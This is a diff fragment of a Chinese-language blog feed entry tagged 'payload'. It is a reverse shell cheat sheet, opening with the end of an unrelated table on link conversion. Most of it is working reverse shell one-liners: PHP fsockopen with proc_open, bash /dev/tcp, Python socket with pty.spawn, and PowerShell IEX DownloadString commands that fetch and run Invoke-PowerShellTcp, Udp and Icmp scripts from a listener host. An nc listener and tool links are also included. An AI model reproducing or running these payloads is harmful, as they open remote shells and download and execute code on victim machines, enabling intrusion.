+<td><strong>自动处理</strong></td>
+<td><strong>自动链接转换</strong></td>
+<td>仅在安全校验通过后，将纯文本 URL 转换为 <code>&lt;a&gt;</code> 标签，确保输出的 DOM 结构可控。</td>
+</tr>
+</tbody></table>
+<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹<code>shell</code></h1><table>
+<thead>
+<tr>
+<th><strong>方式</strong></th>
+<th><strong>依赖工具</strong></th>
+<th><strong>优点</strong></th>
+<th><strong>缺点</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Bash</strong></td>
+<td>Bash Shell</td>
+<td>无需安装，极其通用</td>
+<td>某些精简系统（如 Alpine）可能不支持</td>
+</tr>
+<tr>
+<td><strong>NC (FIFO)</strong></td>
+<td>netcat</td>
+<td>几乎所有系统都有 nc</td>
+<td>命令较长，容易出错</td>
+</tr>
+<tr>
+<td><strong>Python</strong></td>
+<td>Python 2&#x2F;3</td>
+<td>交互性强，稳定</td>
+<td>需要预装 Python 环境</td>
+</tr>
+<tr>
+<td><strong>PHP</strong></td>
+<td>PHP-cli</td>
+<td>Web 服务器常用</td>
+<td>需要 PHP 命令行模式支持</td>
+</tr>
+</tbody></table>
+<h2 id="PHP-Reverse-Shell"><a href="#PHP-Reverse-Shell" class="headerlink" title="PHP Reverse Shell"></a>PHP Reverse Shell</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span> (<span class="number">0</span>);</span><br><span class="line"><span class="variable">$ip</span>=<span class="string">&quot;192.168.1.1&quot;</span>;</span><br><span class="line"><span class="variable">$port</span>=<span class="number">8080</span>;</span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>,<span class="variable">$port</span>);</span><br><span class="line"><span class="variable">$proc</span>=<span class="title function_ invoke__">proc_open</span>(<span class="string">&quot;/bin/sh -i&quot;</span>, <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="variable">$sock</span>, <span class="number">1</span>=&gt;<span class="variable">$sock</span>, <span class="number">2</span>=&gt;<span class="variable">$sock</span>),<span class="variable">$pipes</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.1.1&quot;,监听端口);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="RCE-Reverse-Shell"><a href="#RCE-Reverse-Shell" class="headerlink" title="RCE Reverse Shell"></a>RCE Reverse Shell</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#centos--反弹shell</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="comment">#宿主</span></span><br><span class="line">nc -lvnp <span class="number">8080</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Python-Reverse-Shell"><a href="#Python-Reverse-Shell" class="headerlink" title="Python Reverse Shell"></a>Python Reverse Shell</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>&quot;,监听端口));os.dup2(s.fileno(),<span class="number">0</span>);os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">#python</span><br><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<span class="number">10</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&quot;,<span class="number">8080</span>));os.dup2(s.fileno(),<span class="number">0</span>);os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);subprocess.<span class="keyword">call</span>([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Windows-Reverse-Shell"><a href="#Windows-Reverse-Shell" class="headerlink" title="Windows Reverse Shell"></a>Windows Reverse Shell</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#powercat反弹</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.204.144:1234/Invoke-PowerShellTcp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">204.144</span> <span class="literal">-port</span> <span class="number">4444</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Reverse UDP shell</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.204.144:1234/Invoke-PowerShellUdp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellUdp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">204.144</span> <span class="literal">-port</span> <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Reverse ICMP shell</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.204.144:1234/Invoke-PowerShellIcmp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellIcmp</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">204.144</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://github.com/besimorhino/powercat">工具</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/2485156">Windows环境下反弹shell各类姿势-腾讯云开发者社区-腾讯云</a></p>
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>payload</tag>
       </tags>
   </entry>
   <entry>
